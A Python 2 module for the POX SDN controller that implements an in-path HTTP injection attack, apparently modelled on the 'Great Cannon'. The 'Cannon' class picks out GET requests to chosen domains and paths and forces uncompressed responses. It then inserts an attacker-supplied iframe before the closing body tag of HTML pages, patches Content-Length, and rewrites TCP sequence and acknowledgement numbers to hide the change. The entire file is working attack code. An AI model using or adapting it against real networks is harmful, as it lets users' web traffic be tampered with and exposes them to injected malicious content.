from pox.lib.packet.ipv4 import ipv4
import re
import sys

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url
        self.flagged_traffic = []
        # format ("<server ip>",<user port>)
        self.injection_progress = {}
        # format (<port numner>,<offset>)
        self.port_offset = {}

    def shouldIntercept(self, tcp, ip1, ip2):
        if len(self.flagged_traffic) == 0:
            return 0, -1
        else:
            for index, traffic_record in enumerate(self.flagged_traffic):
                if ip1 == traffic_record[0] and tcp.dstport == traffic_record[1]:
                    return 1, index
                elif ip2 == traffic_record[0] and tcp.srcport == traffic_record[1]:
                    return 2, index
            return 0, -1
    
    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
        # filter tcp traffic
        tcp = ip_packet.find('tcp')
        modify_switch = 1
        if tcp is not None:
            # filter http traffic
            if tcp.srcport == 80 or tcp.dstport == 80:
                # modify original 
                trafficType, record_index = self.shouldIntercept(tcp, ip_packet.srcip, ip_packet.dstip)
                if trafficType == 1:
                    print record_index,"Server to client Seq=",tcp.seq-self.port_offset[tcp.srcport],"ack=",tcp.ack-self.port_offset[tcp.dstport],"len=",len(tcp.payload)
                    # modify ack, seq number    
                    if tcp.dstport in self.injection_progress:
                        if self.injection_progress[tcp.dstport] > 0:
                            print "3/3 ready to change seq"
                            if (modify_switch):
                                print "current offset", self.injection_progress[tcp.dstport]
                                print "original seq",tcp.seq, "modified seq",(tcp.seq + self.injection_progress[tcp.dstport]) 
                                tcp.seq = (tcp.seq + self.injection_progress[tcp.dstport]) #% sys.maxint
                        elif self.injection_progress[tcp.dstport] < 0:
                            print "2/3 waiting for body tag to be changed"
                    if len(tcp.payload) > 0 :
                        # modify content-length
                        if tcp.payload[:15] == "HTTP/1.1 200 OK":
                            # find content-length
                            accept_index = tcp.payload.find("Content-Type: ")
                            print(tcp.payload[accept_index+14:accept_index+23])
                            if (tcp.payload[accept_index+14:accept_index+23]=="text/html"):
                                print "1/3 Content length modified"
                                cl_index = tcp.payload.find("Content-Length: ")
                                if (cl_index != -1):
                                    cl_start = cl_index + 16
                                    cl_end = cl_start
                                    for i in range(10):
                                        if tcp.payload[cl_start + i] == "\r":
                                            cl_end = cl_start + i
                                            break
                                    cl_end = cl_end + 1
                                    l = int(tcp.payload[cl_start : cl_end])
                                    l = l + 24 + len(self.iframe_url)
                                    self.injection_progress[tcp.dstport] = -24 - len(self.iframe_url)
                                    if (modify_switch):
                                        tcp.payload = tcp.payload[:cl_start]+str(l)+tcp.payload[cl_end:]
                        # modify </body> tag
                        bodyClosingTag = tcp.payload.find("</BODY>")
                        if (bodyClosingTag==-1):
                            bodyClosingTag = tcp.payload.find("</body>")
                        if (bodyClosingTag!=-1):
                                print "2/3 Body tag modified"
                                injectedPayload = (tcp.payload[:bodyClosingTag]
                                    + "<iframe src=\""
                                    + self.iframe_url
                                    + "\"></iframe>"
                                    + tcp.payload[bodyClosingTag:])
                                current_l = self.injection_progress[tcp.dstport]
                                if (current_l < 0):
                                    self.injection_progress[tcp.dstport] = 0 - current_l
                                else:
                                    self.injection_progress[tcp.dstport] = current_l + current_l
                                if (modify_switch):
                                    tcp.payload = injectedPayload
                    print ""
                elif trafficType == 2:
                    print record_index,"Client to Server Seq=",tcp.seq-self.port_offset[tcp.srcport],"ack=",tcp.ack-self.port_offset[tcp.dstport],"len=",len(tcp.payload)
                    if tcp.srcport in self.injection_progress:
                        if self.injection_progress[tcp.srcport] > 0:
                            print "3/3 ready to change ack"
                            if (modify_switch):
                                print "current offset", self.injection_progress[tcp.srcport]
                                print "original ack", tcp.ack, "new ack", (tcp.ack - self.injection_progress[tcp.srcport]) 
                                tcp.ack = (tcp.ack - self.injection_progress[tcp.srcport]) #% sys.maxint
                        elif self.injection_progress[tcp.srcport] < 0:
                            print "2/3 waiting for body tag to be changed"
                    print ""
                else:
                # intercept new GET request
                    if len(tcp.payload) > 0:
                        if tcp.payload[:3] == "GET":
                            # get, host = extractGetAndHost(tcp.payload)
                            e = tcp.payload.split("\r\n")
                            get = e[0][4:-9]
                            host = e[1][6:]
                            if ((self.target_domain_re.search(host) is not None) and
                                    (self.url_path_re.search(get) is not None)):
                                    for i,s in enumerate(e):
                                        if s[:15] == "Accept-Encoding":
                                            # encoding = s[:15][17:]
                                            encoding = "identity           "
                                            s = s[:17] + encoding
                                            e[i] = s
                                            newPayload = "\r\n". join(e)
                                            ip_packet.payload.payload = newPayload
                                            self.flagged_traffic.append((ip_packet.dstip, tcp.srcport))
                                            print ""
                                    self.port_offset[tcp.srcport] = tcp.seq - 1
                                    self.port_offset[tcp.dstport] = tcp.ack - 1
                                    print record_index,"Client to Server Seq=",tcp.seq-self.port_offset[tcp.srcport],"ack=",tcp.ack-self.port_offset[tcp.dstport],"len=",len(tcp.payload)
                                    print "0/3 GET Captured"
            # Must return an ip packet or None
    	return ip_packet